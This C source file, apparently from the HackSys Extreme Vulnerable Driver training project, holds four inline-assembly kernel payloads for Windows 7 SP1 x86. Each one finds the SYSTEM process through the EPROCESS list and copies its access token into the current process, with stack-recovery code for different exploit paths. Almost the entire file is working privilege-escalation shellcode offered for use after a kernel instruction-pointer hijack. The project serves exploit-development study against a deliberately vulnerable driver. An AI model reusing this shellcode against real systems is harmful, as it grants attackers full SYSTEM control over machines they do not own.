/*++

 /$$   /$$                     /$$        /$$$$$$                     
| $$  | $$                    | $$       /$$__  $$                    
| $$  | $$  /$$$$$$   /$$$$$$$| $$   /$$| $$  \__/ /$$   /$$  /$$$$$$$
| $$$$$$$$ |____  $$ /$$_____/| $$  /$$/|  $$$$$$ | $$  | $$ /$$_____/
| $$__  $$  /$$$$$$$| $$      | $$$$$$/  \____  $$| $$  | $$|  $$$$$$ 
| $$  | $$ /$$__  $$| $$      | $$_  $$  /$$  \ $$| $$  | $$ \____  $$
| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$/|  $$$$$$$ /$$$$$$$/
|__/  |__/ \_______/ \_______/|__/  \__/ \______/  \____  $$|_______/ 
                                                   /$$  | $$          
                                                  |  $$$$$$/          
                                                   \______/           


Copyright (C) 2010-2015 HackSys Team. All rights reserved.

This file is part of HackSys Extreme Vulnerable Driver Exploit.

See the file 'LICENSE' for copying permission.

Author : Ashfaq Ansari
Contact: ashfaq_ansari1989[at]hotmail.com
Website: http://hacksys.vfreaks.com

Project Name:
    HackSys Extreme Vulnerable Driver Exploit

Module Name:
    Payloads.c

Abstract:
    This module implements the EoP payload used for privilege 
    escalation after gaining control of the instruction pointer 
    in kernel.

Test Bed:
    These payloads have been tested on Windows 7 SP1 x86

TODO:
    1. Add a better version of the EoP payload, basically DuplicateToken() 
       stuff.
    2. Try to have a universal payload and add a better way to do Kernel 
       Recovery.

--*/

#include "Payloads.h"

VOID TokenStealingShellcodeWin7() {
    // Importance of Kernel Recovery
    __asm {
        ; initialize
        pushad                               ; save registers state

        xor eax, eax                         ; Set zero
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                         ; Copy current _EPROCESS structure

        mov ebx, [eax + TOKEN_OFFSET]        ; Copy current nt!_EPROCESS.Token
        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM Process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + TOKEN_OFFSET], edx        ; Copy nt!_EPROCESS.Token of SYSTEM
                                             ; to current process
        popad                                ; restore registers state

        ; recovery
        xor eax, eax                         ; Set NTSTATUS SUCCEESS
        add esp, 12                          ; fix the stack
        pop ebp
        ret 8
    }
}

VOID TokenStealingShellcodeGSWin7() {
    // Importance of Kernel Recovery
    __asm {
        ; initialize
        pushad                               ; save registers state

        xor eax, eax                         ; Set zero
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                         ; Copy current _EPROCESS structure

        mov ebx, [eax + TOKEN_OFFSET]        ; Copy current nt!_EPROCESS.Token
        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM Process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + TOKEN_OFFSET], edx        ; Copy nt!_EPROCESS.Token of SYSTEM
                                             ; to current process
        popad                                ; restore registers state

        ; recovery
        add esp, 0x418
        mov ebx, [esp]                       ; restore the DbgPrint string
        add esp, 0x42c
        mov eax,esp
        add eax, 0x18
        mov edi,[eax]                        ; restore the pointer to Irp
        xor eax, eax                         ; Set NTSTATUS SUCCEESS
        pop ebp
        ret 8
    }
}

VOID TokenStealingShellcodeWin7Generic() {
    // No Need of Kernel Recovery as we are not corrupting anything
    __asm {
        ; initialize
        pushad                               ; save registers state

        xor eax, eax                         ; Set zero
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                         ; Copy current _EPROCESS structure

        mov ebx, [eax + TOKEN_OFFSET]        ; Copy current nt!_EPROCESS.Token
        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM Process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + TOKEN_OFFSET], edx        ; Copy nt!_EPROCESS.Token of SYSTEM
                                             ; to current process
        popad                                ; restore registers state
    }
}

VOID TokenStealingShellcodePoolOverflowWin7() {
    __asm {
        ; initialize
        pushad                               ; save registers state

        xor eax, eax                         ; Set zero
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                         ; Copy current _EPROCESS structure

        mov ebx, [eax + TOKEN_OFFSET]        ; Copy current nt!_EPROCESS.Token
        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM Process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + TOKEN_OFFSET], edx        ; Copy nt!_EPROCESS.Token of SYSTEM
                                             ; to current process
        popad                                ; restore registers state

        ; recovery
        mov eax, 0x1
    }
}
